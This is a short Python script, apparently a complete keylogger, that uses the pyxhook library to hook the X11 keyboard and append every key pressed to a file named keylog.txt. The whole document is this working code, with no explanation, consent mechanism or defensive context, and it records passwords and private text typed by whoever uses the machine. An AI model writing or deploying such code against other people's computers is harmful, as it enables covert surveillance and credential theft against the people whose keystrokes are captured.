import pyxhook

log_file = "keylog.txt"

def KeyPress(event):
    key_file = open(log_file,'a')
    key_file.write(event.Key)
    key_file.write('\n')

new_hook = pyxhook.HookManager()
new_hook.KeyDown=KeyPress
new_hook.HookKeyboard()
new_hook.start()